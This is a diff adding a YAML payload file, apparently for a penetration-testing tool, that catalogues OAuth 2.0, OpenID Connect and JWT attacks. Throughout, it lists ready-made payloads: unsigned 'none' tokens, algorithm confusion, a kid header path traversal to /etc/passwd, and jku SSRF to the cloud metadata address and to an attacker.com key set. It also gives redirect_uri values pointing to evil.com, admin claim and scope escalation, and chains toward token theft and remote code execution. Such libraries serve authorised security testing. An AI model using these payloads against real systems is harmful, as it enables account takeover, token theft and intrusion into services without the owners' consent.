@@ -1,0 +1,88 @@
+name: OAuth & JWT Attacks
+description: OAuth 2.0/OpenID Connect misconfigurations and JWT attacks.
+basic_payloads:
+- Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
+- access_token=...
+- redirect_uri=https://evil.com
+bypass_techniques:
+- name: JWT None Algorithm
+  description: Set alg to none to bypass signature verification
+  payloads:
+  - '{"alg":"none","typ":"JWT"}'
+  - '{"alg":"None","typ":"JWT"}'
+- name: JWT Algorithm Confusion
+  description: Confuse HS256 with RS256
+  payloads:
+  - '{"alg":"HS256","typ":"JWT"}'
+  - '{"alg":"HS384","typ":"JWT"}'
+- name: JWT Kid Injection
+  description: Path traversal in kid header
+  payloads:
+  - '{"kid":"../../../etc/passwd","alg":"HS256"}'
+  - '{"kid":"/dev/null","alg":"HS256"}'
+- name: JWT JKU/SSRF
+  description: SSRF via jku header
+  payloads:
+  - '{"jku":"http://169.254.169.254/latest/meta-data/","alg":"RS256"}'
+  - '{"jku":"http://attacker.com/evil-jwk.json","alg":"RS256"}'
+- name: JWT Sub Claim Manipulation
+  description: Modify sub claim for privilege escalation
+  payloads:
+  - '{"sub":"admin"}'
+  - '{"sub":"user","role":"admin"}'
+- name: JWT Expiration Bypass
+  description: Remove or modify expiration
+  payloads:
+  - '{"exp":9999999999}'
+  - '{"iat":1,"exp":9999999999}'
+- name: OAuth Redirect URI Bypass
+  description: Manipulate redirect_uri
+  payloads:
+  - redirect_uri=https://evil.com
+  - redirect_uri=https://target.com.evil.com
+  - redirect_uri=https://target.com/?redirect=https://evil.com
+- name: OAuth Scope Escalation
+  description: Request higher privileges
+  payloads:
+  - scope=admin
+  - scope=read_write openid profile email admin
+- name: OAuth Code Injection
+  description: Intercept and replay auth codes
+  payloads:
+  - code=stolen_code
+- name: OAuth PKCE Downgrade
+  description: Downgrade PKCE to authorization code
+  payloads:
+  - Remove code_challenge parameter
+  - Set code_challenge_method=plain
+- name: OpenID Connect ID Token Manipulation
+  description: Manipulate OIDC id_token
+  payloads:
+  - '{"nonce":"attacker_nonce"}'
+  - '{"acr":"high"}'
+detection_patterns:
+- grant_type
+- authorization_code
+- client_id
+- redirect_uri
+- access_token
+- id_token
+- 'Bearer '
+- eyJ
+- .well-known/openid-configuration
+chain_templates:
+- name: OAuth Redirect -> Token Theft
+  description: Steal OAuth tokens via open redirect
+  requirements:
+  - oauth_endpoint
+  - open_redirect
+- name: JWT Kid Injection -> RCE
+  description: RCE via kid header command injection
+  requirements:
+  - jwt_accepted
+  - unsanitized_kid
+- name: OAuth Scope Escalation -> Admin
+  description: Escalate privileges via scope manipulation
+  requirements:
+  - oauth_endpoint
+  - scope_not_verified
